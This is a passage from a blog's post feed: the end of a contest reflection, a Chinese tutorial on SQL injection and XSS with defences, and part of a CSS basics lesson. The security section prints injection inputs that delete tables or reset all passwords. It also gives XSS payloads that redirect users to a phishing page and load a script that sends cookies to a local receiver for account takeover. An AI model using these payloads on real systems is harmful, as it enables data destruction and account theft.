<li>返回：本来打算继续识别数字，但仍要拍照，而且增大运算量，于是，我们可以使用列表存储路径，返回的时候逆向遍历即可。</li>
</ul>
<h2 style="text-align:center;font-weight:700;color:#B399FF">反思总结</h2>
<ol>
<li>3天速成Openmv，又接触了micropython <span class="emoji" alias="open_mouth" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f62e.png?v8">😮</span>，最后效果还是可以滴！</li>
<li>硬件搭得晚了点儿，导致调试，确定识别方法有些晚</li>
<li>传感器方面准备不足，需要在这方面下一些功夫咯</li>
<li>编程底层有些混乱，虽然程序可以跑，但连我自己都在吐槽</li>
</ol>
<p><font style="font-weight:700;color:#B399FF">唯一遗憾的就是没有在宿舍看EDG捧起奖杯！</font><span class="emoji" alias="sob" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f62d.png?v8">😭</span><span class="emoji" alias="sob" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f62d.png?v8">😭</span><span class="emoji" alias="sob" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f62d.png?v8">😭</span></p>
]]></content>
      <categories>
        <category>竞赛</category>
      </categories>
      <tags>
        <tag>NUEDC</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全</title>
    <url>/web/Permeate/</url>
    <content><![CDATA[<div align="center"><h3>SQL</h3></div>
<h4 id="SQL简单介绍">SQL简单介绍</h4>
<ul>
<li>SQL 指结构化查询语言，全称是 Structured Query Language。</li>
<li>SQL 让您可以访问和处理数据库，包括数据插入、查询、更新和删除。</li>
<li>SQL 在1986年成为 ANSI（American National Standards Institute 美国国家标准化组织）的一项标准，在 1987 年成为国际标准化组织（ISO）标准。</li>
</ul>
<h4 id="SQL注入流程：">SQL注入流程：</h4>
<ol>
<li>sql注入的原理以及sqllite数据库</li>
<li>sqlite的安装以及基本语句</li>
<li>结合靶场理解sqlite的注入流程</li>
</ol>
<h4 id="SQL注入简介">SQL注入简介</h4>
<p>SQL注入是网站存在最多也是最简单的漏洞，主要原因是程序对用户输入的字符串没有进行过滤或处理不严谨。至今SQL注入仍然是首要的难以修复的安全漏洞。</p>
<h4 id="SQL注入的原理">SQL注入的原理</h4>
<p>SQL 注入的原理主要有以下 4 点：</p>
<h5 id="1）恶意拼接查询">1）恶意拼接查询</h5>
<p>我们知道，SQL 语句可以查询、插入、更新和删除数据，且使用分号来分隔不同的命令。例如：</p>
<p><code>SELECT * FROM users WHERE user_id = $user_id</code></p>
<p>其中，user_id 是传入的参数，如果传入的参数值为“1234; DELETE FROM users”，那么最终的查询语句会变为：</p>
<p><code>SELECT * FROM users WHERE user_id = 1234; DELETE FROM users</code></p>
<p>如果以上语句执行，则会删除 users 表中的所有数据。</p>
<h5 id="2）利用注释执行非法命令。">2）利用注释执行非法命令。</h5>
<p>SQL 语句中可以插入注释。例如：</p>
<p><code>SELECT COUNT(*) AS 'num' FROM game_score WHERE game_id=24411 AND version=$version</code></p>
<p>如果 version 包含了恶意的字符串<code>'-1' OR 3 AND SLEEP(500)--</code>，那么最终查询语句会变为：</p>
<p><code>SELECT COUNT(*) AS 'num' FROM game_score WHERE game_id=24411 AND version='-1' OR 3 AND SLEEP(500)--</code></p>
<p>以上恶意查询只是想耗尽系统资源，SLEEP(500) 将导致 SQL 语句一直运行。如果其中添加了修改、删除数据的恶意指令，那么将会造成更大的破坏。</p>
<h5 id="3）传入非法参数">3）传入非法参数</h5>
<p>SQL 语句中传入的字符串参数是用单引号引起来的，如果字符串本身包含单引号而没有被处理，那么可能会篡改原本 SQL 语句的作用。 例如：</p>
<p><code>SELECT * FROM user_name WHERE user_name = $user_name</code></p>
<p>如果 user_name 传入参数值为 G’chen，那么最终的查询语句会变为：</p>
<p><code>SELECT * FROM user_name WHERE user_name ='G'chen'</code></p>
<p>一般情况下，以上语句会执行出错，这样的语句风险比较小。虽然没有语法错误，但可能会恶意产生 SQL 语句，并且以一种你不期望的方式运行。</p>
<h5 id="4）添加额外条件">4）添加额外条件</h5>
<p>在 SQL 语句中添加一些额外条件，以此来改变执行行为。条件一般为真值表达式。例如：</p>
<p><code>UPDATE users SET userpass='$userpass' WHERE user_id=$user_id;</code></p>
<p>如果 user_id 被传入恶意的字符串“1234 OR TRUE”，那么最终的 SQL 语句会变为：</p>
<p><code>UPDATE users SET userpass= '123456' WHERE user_id=1234 OR TRUE;</code></p>
<p>这将更改所有用户的密码。</p>
<h4 id="避免SQL注入">避免SQL注入</h4>
<p>对于 SQL 注入，我们可以采取适当的预防措施来保护数据安全。下面是避免 SQL 注入的一些方法。</p>
<h5 id="1-过滤输入内容，校验字符串">1. 过滤输入内容，校验字符串</h5>
<p>过滤输入内容就是在数据提交到数据库之前，就把用户输入中的不合法字符剔除掉。可以使用编程语言提供的处理函数或自己的处理函数来进行过滤，还可以使用正则表达式匹配安全的字符串。</p>
<p>如果值属于特定的类型或有具体的格式，那么在拼接 SQL 语句之前就要进行校验，验证其有效性。比如对于某个传入的值，如果可以确定是整型，则要判断它是否为整型，在浏览器端（客户端）和服务器端都需要进行验证。</p>
<h5 id="2-参数化查询">2. 参数化查询</h5>
<p>参数化查询目前被视作是预防 SQL 注入攻击最有效的方法。参数化查询是指在设计与数据库连接并访问数据时，在需要填入数值或数据的地方，使用参数（Parameter）来给值。</p>
<p>MySQL 的参数格式是以“?”字符加上参数名称而成，如下所示：</p>
<p><code>UPDATE myTable SET c1 = ?c1, c2 = ?c2, c3 = ?c3 WHERE c4 = ?c4</code></p>
<p>在使用参数化查询的情况下，数据库服务器不会将参数的内容视为 SQL 语句的一部分来进行处理，而是在数据库完成 SQL 语句的编译之后，才套用参数运行。因此就算参数中含有破坏性的指令，也不会被数据库所运行。</p>
<h5 id="3-安全测试、安全审计">3. 安全测试、安全审计</h5>
<p>除了开发规范，还需要合适的工具来确保代码的安全。我们应该在开发过程中应对代码进行审查，在测试环节使用工具进行扫描，上线后定期扫描安全漏洞。通过多个环节的检查，一般是可以避免 SQL 注入的。</p>
<p>有些人认为存储过程可以避免 SQL 注入，存储过程在传统行业里用得比较多，对于权限的控制是有一定用处的，但如果存储过程用到了动态查询，拼接 SQL，一样会存在安全隐患。</p>
<h4 id="方法">方法</h4>
<h5 id="1-避免使用动态SQL">1. 避免使用动态SQL</h5>
<p>避免将用户的输入数据直接放入 SQL 语句中，最好使用准备好的语句和参数化查询，这样更安全。</p>
<h5 id="2-不要将敏感数据保留在纯文本中">2. 不要将敏感数据保留在纯文本中</h5>
<p>加密存储在数据库中的私有/机密数据，这样可以提供了另一级保护，以防攻击者成功地排出敏感数据。</p>
<h5 id="3-限制数据库权限和特权">3. 限制数据库权限和特权</h5>
<p>将数据库用户的功能设置为最低要求；这将限制攻击者在设法获取访问权限时可以执行的操作。</p>
<h5 id="4-避免直接向用户显示数据库错误">4. 避免直接向用户显示数据库错误</h5>
<p>攻击者可以使用这些错误消息来获取有关数据库的信息。</p>
<p>一些编程框架对于写出更安全的代码也有一定的帮助，因为它提供了一些处理字符串的函数和使用查询参数的方法。但同样，你仍然可以编写出不安全的 SQL 语句。所以归根到底，我们需要有良好的编码规范，并能充分利用参数化查询、字符串处理和参数校验等多种办法来保护数据库和程序的安全。</p>
<div align="center"><h3>XSS</h3></div>
<h4 id="XSS的简单介绍">XSS的简单介绍</h4>
<ul>
<li>跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets,CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户目的。</li>
<li>XSS危害：
<ul>
<li>流量劫持</li>
<li>获取用户cookie信息，盗取账号</li>
<li>篡改、删除页面信息（钓鱼）</li>
<li>配合CSRF攻击，实施进一步攻击</li>
</ul>
</li>
<li>XSS分类
<ul>
<li>反射型XSS：反射型XSS也被称为非持久性XSS，当用户访问一个带有XSS代码的HTML请求时，服务器端接收数据后处理，然后把带有XSS的数据发送到浏览器，浏览器解析这段带有XSS代码的数据后，就造成XSS漏洞，这个过程就像一次反射，所以叫反射型XSS。</li>
<li>存储型XSS：存储型XSS又被称为持久性XSS，存储型XSS是最危险的一种跨站脚本漏洞，当攻击者提交一段 XSS代码后，被服务端接收并存储，当攻击者或用户再次访问某个页面时，这段XSS代码被程序读出来响应给浏览器，造成XSS跨站攻击，这是存储型XSS。</li>
<li>DOM型：不经过后端,DOM—based XSS漏洞是基于文档对象模型Document Objeet Model,DOM)的一种漏洞,dom - xss是通过url传入参数去控制触发的。</li>
</ul>
</li>
</ul>
<h4 id="一、钓鱼指向">一、钓鱼指向</h4>
<p>在用户名框中输入<code>&lt;script&gt;alert(2)&lt;/script&gt;</code>(闭合input标签)，界面弹窗，证明该系统存在XSS注入。上一步验证得出，该页面存在XSS漏洞。接下来针对该漏洞进行修改链接属性实现跳转到钓鱼界面</p>
<p>在username=后面加上<code>&lt;script&gt;document.getElementsByTagName(&quot;body&quot;)[0].onload=function changeLink()&#123;document.getElementById(&quot;myId&quot;).href='http://127.0.0.1:8082/wjmm.php';&#125;&lt;/script&gt;</code>（修改忘记密码a标签的href，使其指向钓鱼网站）收到cookie后，手动给浏览器添加对应cookie，实现伪造管理员（用户）登录</p>
<h4 id="二、盗取Cookie">二、盗取Cookie</h4>
<p>将js代码<code>&lt;/textarea&gt;'&quot;&gt;&lt;script src=http://127.0.0.1:8081/xss/cGMiSw?1555397544&gt;&lt;/script&gt;</code> 发表在文章管理系统的留言板上（该地址指向存放接收信息的服务器上的js路径）</p>
<p>当后台管理员审核留言（或者其他用户查看到该留言）时，触发页面执行js脚本，将浏览器的cookie发送到接收服务器</p>
<h4 id="XSS防范">XSS防范</h4>
<ul>
<li>XSS的威力主要是取决于JavaScript能够实现的程度，XSS跨站脚本的形成原因是对输入输出没有严格过滤，导致在页面上可以执行JavaScript等客户端代码，所以只要将敏感字符过滤，就可以修复XSS跨站漏洞。</li>
<li>修复和防范方法：
<ul>
<li>三种类型的XSS漏洞都可以通过过滤或编码进行修复。</li>
<li>反射型XSS和存储型XSS可以在服务端对用户输入输出的内容过滤和编码操作，将关键字进行过滤处理，关键符号进行编码处理，如将所有on事件,script等关键字进行过滤，将所有&lt;,&gt;,”,’,=等特殊符号进行实体化编码或url编码便可以修复。</li>
<li>DOM型XSS如有在服务端进行交互，也可参考上述的方法进行修复，如未和服务端进行交互，可在客户端使用JavaScript等客户端脚本语言进行编码和过滤处理。</li>
</ul>
</li>
</ul>
<h3 id="待续…">待续…</h3>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>CSS基础知识介绍！</title>
    <url>/web/CSS/</url>
    <content><![CDATA[<h2 id="CSS的主要使用场景就是美化网页、布局页面的">CSS的主要使用场景就是美化网页、布局页面的</h2>
<ul>
<li>HTML的局限性：只关注内容的语义</li>
<li>CSS-网页美容师：层叠样式表的简称</li>
<li>CSS基础选择器</li>
<li>CSS语法规范：有选择器以及一条或多条声明</li>
<li>标签选择器：用HTML标签名称作为选择器</li>
</ul>
<h3 id="CSS-选择器">CSS 选择器</h3>
<h4 id="类选择器">类选择器</h4>
<pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">.类名</span> <span class="token punctuation">&#123;</span>
	<span class="token property">属性1</span><span class="token punctuation">:</span> 属性值1<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
&lt;div class=<span class="token string">"类名"</span> </code></pre>
<p>⚠ <strong>注意</strong></p>
<ol>
<li>类选择器使用&quot;.&quot;进行标识，后面紧跟类名（自定义，我们自己命名的）</li>
<li>可以理解为给这个标签起了一个名字，来表示</li>
<li>长名称或词组可以使用中横线来为选择器命名</li>
<li>不要使用纯数字、中文等命名，尽量使用英文字母来表示</li>
<li>命名要有意义，尽量使别人一眼就知道这个类名的目的</li>
<li>命名规范：见附件（Web前端开发规范手册.doc）</li>
</ol>
<h4 id="多类名">多类名</h4>
<ul>
<li>在标签class中填写多类名</li>
<li>每个类名用空格分开</li>
</ul>
<h4 id="id选择器">id选择器</h4>
<pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">#id名</span> <span class="token punctuation">&#123;</span>
	<span class="token property">属性1</span><span class="token punctuation">:</span> 属性值1；
	...
<span class="token punctuation">&#125;</span></code></pre>
<p><strong>注意id属性只能在每个HTML文档中出现一次。</strong></p>
<p>id选择器和类选择器的区别</p>
<ol>
<li>类选择器好比人的名字，一个人可以有多个名字，同时一个名字也可以被多个人使用</li>
<li>id选择器好比人的身份证号码，全中国是唯一的，不得重复</li>
<li>id选择器和类选择器最大的不同在于使用次数上</li>
<li>类选择器在修改样式中用的最多，id选择器一般用于页面唯一性的元素，经常和JS搭配使用</li>
</ol>
<h4 id="通配符选择器">通配符选择器</h4>
<p>在CSS中，通配符选择器用&quot;*&quot;定义，他表示选取页面中所有元素</p>
<pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">*</span> <span class="token punctuation">&#123;</span>
	<span class="token property">属性1</span><span class="token punctuation">:</span> 属性值1；
	...
<span class="token punctuation">&#125;</span>
<span class="token selector"># 特殊情况才使用（清除所有元素标签的内外边距）
*</span> <span class="token punctuation">&#123;</span>
	<span class="token property">margin</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
	<span class="token property">padding</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>
<h4 id="基础选择器总结">基础选择器总结</h4>
<table>
<thead>
<tr>
<th>基础选择器</th>
<th>作用</th>
<th>特点</th>
<th>使用情况</th>
<th>用法</th>
</tr>
</thead>
<tbody>
<tr>
<td>标签选择器</td>
<td>可以选出所有相同的标签，比如p</td>
<td>不能差异化选择</td>
<td>较多</td>
<td>p {color: red;}</td>
</tr>
<tr>
<td>类选择器</td>
<td>可以选出1个或多个标签</td>
<td>可以根据需求选择</td>
<td>非常多</td>
<td>.nav {color: red;}</td>
</tr>
<tr>
<td>id选择器</td>
<td>一次只能选择1个标签</td>
<td>id属性只能在每个HTML文档中出现一次</td>
<td>一般和JS搭配</td>
<td>#nav {color: red;}</td>
</tr>
<tr>
<td>通配符选择器</td>
<td>选择所有的标签</td>
<td>选择的太多，有部分不需要</td>
<td>特殊情况使用</td>
<td>* {color: red;}</td>
</tr>
</tbody>
</table>
<h3 id="CSS-字体属性">CSS 字体属性</h3>
<h4 id="字体系列">字体系列</h4>
<p>CSS使用<strong>font-family</strong>属性定义文本的字体系列</p>
<pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">p</span> <span class="token punctuation">&#123;</span><span class="token property">font-family</span><span class="token punctuation">:</span><span class="token string">"微软雅黑"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
<span class="token selector">body</span> <span class="token punctuation">&#123;</span><span class="token property">font-family</span><span class="token punctuation">:</span><span class="token string">"Microsoft YaHei"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>
<ul>
<li>各种字体之间必须使用英文状态下的逗号隔开</li>
<li>一般情况下，如果有空格隔开的多个单词组成的字体，加引号</li>
<li>尽量使用系统默认自带字体，保证在任何用户的浏览器中都能正常显示</li>
</ul>
<h4 id="大小">大小</h4>
<p>CSS使用<strong>font-size</strong>属性定义字体大小</p>
<pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">p</span> <span class="token punctuation">&#123;</span>
	<span class="token property">font-size</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>
<ul>
<li>px大小是我们网页的最常用的单位</li>
<li>谷歌浏览器默认的文字大小为16px</li>
<li>不同浏览器可能默认显示的字号大小不一致，我们尽量给一个明确值大小，不要默认大小</li>
<li>可以给body指定整个页面的文字大小</li>
<li>标题标签比较特殊，需要单独指定文字大小</li>
</ul>
<h4 id="粗细">粗细</h4>
<p>CSS使用<strong>font-weight</strong>属性设置文本粗细</p>
<pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">p</span> <span class="token punctuation">&#123;</span>
	<span class="token property">font-weight</span><span class="token punctuation">:</span> bold<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>
<table>
<thead>
<tr>
<th>属性值</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>normal</td>
<td>默认值（不加粗）</td>
</tr>
<tr>
<td>bold</td>
<td>定义粗体（加粗）</td>
</tr>
<tr>
<td>100~900·</td>
<td>400等同于normal，而700等同于bold（数字后面不加单位）</td>
</tr>
</tbody>
</table>
<ul>
<li>学会让加粗标签（比如h和strong等）不加粗，或者其他标签加粗</li>
<li>实际开发时，我们更喜欢用数字表示粗细</li>
</ul>
<h4 id="文字样式">文字样式</h4>
<p>CSS使用<strong>font-style</strong>属性设置文本的风格</p>
<pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">P</span> <span class="token punctuation">&#123;</span>
	<span class="token property">font-style</span><span class="token punctuation">:</span> normal<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>
<table>
<thead>
<tr>
<th>属性值</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>normal</td>
<td>默认值，浏览器会显示标准的字体样式font-style：normal；</td>
</tr>
<tr>
<td>italic</td>
<td>浏览器会显示斜体的字体样式</td>
</tr>
</tbody>
</table>
<h4 id="字体符合属性">字体符合属性</h4>
<p>字体属性可以把以上文字样式综合来写，节约代码</p>
<pre class="language-css" data-language="css"><code class="language-css"># 复合属性有要求
<span class="token property">font</span><span class="token punctuation">:</span> font-style font-weight font-size/line-height font-family
<span class="token property">font</span><span class="token punctuation">:</span> italic 700 16px Microsoft yahei</code></pre>
<ul>
<li>使用font属性时，必须按上面语法格式中的顺序书写，不能更换顺序，并且各个属性之间以空格分开</li>
<li>不需要设置的属性可以省略（取默认值），但必须保留font-size和font-family属性，否则font属性将不起作用</li>
</ul>
<h4 id="CSS字体属性总结">CSS字体属性总结</h4>
<table>
<thead>
<tr>
<th>属性</th>
<th>表示</th>
<th>注意点</th>
</tr>
</thead>
<tbody>
<tr>
<td>font-size</td>
<td>字号</td>
<td>我们通常用的单位时px像素，一定要跟上单位</td>
</tr>
<tr>
<td>font-family</td>
<td>字体</td>
<td>实际工作中按照团队约定来写字体</td>
</tr>
<tr>
<td>font-weight</td>
<td>字体粗细</td>
<td>记住加粗时700或者bold不加粗是normal或者400（不加单位</td>
</tr>
<tr>
<td>font-style</td>
<td>字体样式</td>
<td>记住倾斜是italic    不倾斜是normal工作中我们最常用normal</td>
</tr>
<tr>
<td>font</td>
<td>字体连写</td>
<td>字体连写是有顺序的，不能随意换位置，字体和字号必须有</td>
</tr>
</tbody>
</table>
<h3 id="CSS-文本属性">CSS 文本属性</h3>
<p>CSS Text（文本）属性可定义文本的外观，比如文本的颜色、对齐文本、装饰文本、文本缩进、行间距等。</p>
<h4 id="文本颜色">文本颜色</h4>
<p><strong>color</strong>属性用于定义文本颜色</p>
<pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">div</span> <span class="token punctuation">&#123;</span>
	<span class="token property">color</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>
<table>
<thead>
<tr>
<th>表示</th>
<th>属性值</th>
</tr>
</thead>
<tbody>
<tr>
<td>预定义的颜色值</td>
<td>red，green，blue，还有pink！</td>
</tr>
<tr>
<td>十六进制</td>
<td>#FF0000，#FF6600</td>
</tr>
<tr>
<td>RGB代码</td>
<td>rgb(255,0,0)或rgb(100%,0%,0%)</td>
</tr>
</tbody>
</table>
<p><em><strong>开发中最常用的是十六进制</strong></em></p>
<h4 id="对齐文本">对齐文本</h4>
<p><strong>text-align</strong>属性用于设置元素内文本内容的水平对齐方式</p>
<pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">div</span> <span class="token punctuation">&#123;</span>
	<span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>
<table>
<thead>
<tr>
<th>属性值</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td>left</td>
<td>左对齐（默认值）</td>
</tr>
<tr>
<td>right</td>
<td>右对齐</td>
</tr>
<tr>
<td>center</td>
<td>居中对齐</td>
</tr>
</tbody>
</table>
<h4 id="装饰文本">装饰文本</h4>
<p><strong>text-decoration</strong>属性规定添加到文本的修饰。可以给文本添加下划线、删除线、上划线等</p>
<pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">div</span> <span class="token punctuation">&#123;</span>
	<span class="token property">text-decoration</span><span class="token punctuation">:</span> underline<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>
<table>
<thead>
<tr>
<th>属性值</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>none</td>
<td>默认。没有装饰线</td>
</tr>
<tr>
<td>underline</td>
<td>下划线。链接a自带下划线（常用）</td>
</tr>
<tr>
<td>overline</td>
<td>上划线。（几乎不用）</td>
</tr>
<tr>
<td>line-through</td>
<td>删除线。（不常用）</td>
</tr>
</tbody>
</table>
<h4 id="文本缩进">文本缩进</h4>
<p><strong>text-indent</strong>属性用来指定文本的<strong>第一行</strong>的缩进，通常是将段落的首行缩进</p>
<pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">div</span> <span class="token punctuation">&#123;</span>
	<span class="token property">text-indent</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span>
	<span class="token property">text-indent</span><span class="token punctuation">:</span> 2em<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>
<p>em是一个相对单位，就是当前元素（font-size）1个文字的大小，如果当前元素没有大小，则会按照父元素的一个文字大小</p>
<h4 id="行间距">行间距</h4>
<p><strong>line-height</strong>属性用于设置行间的距离，可以控制文字行与行之间的距离</p>
<pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">p</span> <span class="token punctuation">&#123;</span>
	<span class="token property">line-height</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>
<p>这一行最下边到下一行最下边的距离就是行高</p>
<h4 id="CSS文本属性总结">CSS文本属性总结</h4>
<table>
<thead>
<tr>
<th>属性</th>
<th>表示</th>
<th>注意点</th>
</tr>
</thead>
<tbody>
<tr>
<td>color</td>
<td>文本颜色</td>
<td>通常用十六进制，简体形式#fff</td>
</tr>
<tr>
<td>text-align</td>
<td>文本对齐</td>
<td>可以设置文字水平的对齐方式</td>
</tr>
<tr>
<td>text-indent</td>
<td>文本缩进</td>
<td>通常我们用于段落首行缩进两个字的距离</td>
</tr>
<tr>
<td>text-decoration</td>
<td>文本修饰</td>
<td>记住添加下划线underline、取消下划线none</td>
</tr>
<tr>
<td>line-height</td>
<td>行高</td>
<td>控制行与行之间的距离</td>
</tr>
</tbody>
</table>
<h3 id="CSS-引入方式">CSS 引入方式</h3>
<p>按照CSS样式书写的位置（或者引入的方式），可以分为三大类：行内样式表（行内式）、内部样式表（嵌入式）、外部样式表（链接式）</p>
<h4 id="内部样式表">内部样式表</h4>
<pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">内部样式表是写到HTML页面内部，是将所有的CSS代码抽取出来，单独放到一个&lt;style>标签中
&lt;style>
	div</span> <span class="token punctuation">&#123;</span>
		<span class="token property">color</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span>
		<span class="token property">font-size</span><span class="token punctuation">:</span> 12px<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
&lt;/style></code></pre>
<h4 id="行内样式表">行内样式表</h4>
<pre class="language-markup" data-language="markup"><code class="language-markup">行内样式表是在元素标签内部的style属性中设定CSS样式，适合简单修改样式
＜div style="color:red; font-size: 12px;">青春不常在，抓紧谈恋爱</code></pre>
<ul>
<li>style其实就是标签的属性</li>
<li>在双引号中间，写法要符合CSS规范</li>
<li>可以控制当前的标签设置样式</li>
<li>由于书写繁琐，并且没有体现出结构与样式分离的思想，所以不推荐大量使用，只有对当前元素添加简单样式的时候，可以考虑使用</li>
<li>使用行内样式表设定CSS，通常也被称为行内式引入</li>
</ul>
<h4 id="外部样式表">外部样式表</h4>
<p>实际开发都是外部样式表，适合于样式比较多的情况:样式单独写到CSS文件中，之后把CSS文件引入到HTML页面中使用</p>
<p>引入外部样式表分为两步：</p>
<pre class="language-markup" data-language="markup"><code class="language-markup">1. 新建一个后缀名为.css的样式文件，把所有的CSS代码都放在此文件中
2. 在HTML页面中，使用<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span><span class="token punctuation">></span></span>标签引入这个文件
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>css文件路径<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre>
<table>
<thead>
<tr>
<th>属性</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>rel</td>
<td>定义当前文档与被链接文档之间的关系，在这里需要指定为“stylesheet”，表示被链接的文档是一个样式表文件</td>
</tr>
<tr>
<td>href</td>
<td>定义所连接外部样式表文件的URL，相对路径、绝对路径都可</td>
</tr>
</tbody>
</table>
<h4 id="CSS引入方式总结">CSS引入方式总结</h4>
<table>
<thead>
<tr>
<th>样式表</th>
<th>优点</th>
<th>缺点</th>
<th>使用情况</th>
<th>控制范围</th>
</tr>
</thead>
<tbody>
<tr>
<td>行内样式表</td>
<td>书写方便，权重高</td>
<td>结构样式混写</td>
<td>较少</td>
<td>控制一个标签</td>
</tr>
<tr>
<td>内部样式表</td>
<td>部分结构和样式相分离</td>
<td>没有彻底分离</td>
<td>较多</td>
<td>控制一个页面</td>
</tr>
<tr>
<td>外部样式表</td>
<td>完全实现结构和样式相分离</td>
<td>需要引入</td>
<td>最多，推荐</td>
<td>控制多个页面</td>
</tr>
</tbody>
</table>
<h3 id="Emmet语法">Emmet语法</h3>
<p>Emmet语法的前身是Zen coding，它使用缩写，来提高html、css的编写速度，Vscode内部已经集成该语法。</p>
<h4 id="快速生成HTML结构语法">快速生成HTML结构语法</h4>
<ol>
<li>生成标签直接输入标签名按tab键即可</li>
<li>如果想要生成多个相同标签加上*就可以了</li>
<li>如果有父子级关系的标签，可以用&gt;比如ul &gt; li就可以了</li>
<li>如果有兄弟关系的标签，用＋就可以了比如div+p</li>
<li>如果生成带有类名或者id名字的，直接写.demo或者#two tab键就可以了</li>
<li>如果生成的div类名是有顺序的，可以用自增符号$</li>
<li>如果想要在生成的$签内部写内容可以用{}表示</li>
</ol>
<h4 id="快速生成CSS样式语法">快速生成CSS样式语法</h4>
<p>CSS基本采取简写形式即可</p>
<ul>
<li>比如 w200 按tab就可以生成 width: 200px;</li>
<li>比如 lh26 按tab可以生成 line-height: 26px;</li>
</ul>
<h4 id="快速格式化代码">快速格式化代码</h4>
<p>设置搜索format勾选format on save</p>
<h3 id="CSS复合选择器">CSS复合选择器</h3>
<p>在CSS中，可以根据选择器的类型把选择器分为<strong>基础选择器</strong>和<strong>复合选择器</strong>，复合选择器是建立在基础选择器之上，对基本选择器进行组合而形成的</p>
<ul>
<li>复合选择器可以更准确、更高效的选择目标元素（标签）</li>
<li>复合选择器是由两个或多个基础选择器，通过不同的方式组合而成的</li>
<li>常用的复合选择器包括：后代选择器、子选择器、并集选择器、伪类选择器等</li>
</ul>
<h4 id="后代选择器（重要）">后代选择器（重要）</h4>
<p>后代选择器又称为包含选择器，可以选择父元素里面的子元素。其写法就是把外侧标签写在前面，内层标签写在后面，中间用空格分隔。当标签发生嵌套是，内层标签就成为外层标签的后代。</p>
<pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">元素1 元素2</span> <span class="token punctuation">&#123;</span> 样式声明 <span class="token punctuation">&#125;</span></code></pre>
<p>上述语法表示选择<strong>元素1里面的所有元素2</strong>（后代元素）</p>
<h4 id="子选择器（重要）">子选择器（重要）</h4>
<p>子元素选择器（子选择器）只能选择作为某元素的最近一级子元素。简单理解就是选亲儿子元素</p>
<pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">元素1 > 元素2</span> <span class="token punctuation">&#123;</span> 样式声明 <span class="token punctuation">&#125;</span></code></pre>
<p>上述语法表示选择元素1里面的所有直接后代（子元素）元素2</p>
<h4 id="并集选择器（重要）">并集选择器（重要）</h4>
<p>并集选择器可以选择多组标签，同时为他们定义相同的格式。通常用于集体声明</p>
<p>并集选择器是通各个选择器通过英文逗号连接而成，任何形式的选择器都可以作为并集选择器的一部分</p>
<pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">元素1, 元素2</span> <span class="token punctuation">&#123;</span> 样式声明 <span class="token punctuation">&#125;</span></code></pre>
<p>上述语法表示选择元素1和元素2</p>
<ul>
<li>元素1和元素2中间用逗号隔开</li>
<li>逗号可以理解为<strong>和</strong>的意思</li>
<li>并集选择器通常用于集体声明</li>
</ul>
<h4 id="链接伪类选择器">链接伪类选择器</h4>
<p>伪类选择器用于向某些选择器添加特殊的效果，比如给链接添加特殊效果，或选择第一个，第n个元素</p>
<pre class="language-css" data-language="css"><code class="language-css"><span class="token property">a</span><span class="token punctuation">:</span>link		# 选择所有未被访问的链接
<span class="token property">a</span><span class="token punctuation">:</span>visited	# 选择所有已被访问的链接
<span class="token property">a</span><span class="token punctuation">:</span>hover		# 选择鼠标指针位于其上的链接
<span class="token property">a</span><span class="token punctuation">:</span>active	# 选择活动链接（鼠标按下未弹起）</code></pre>
<h5 id="注意事项">注意事项</h5>
<ul>
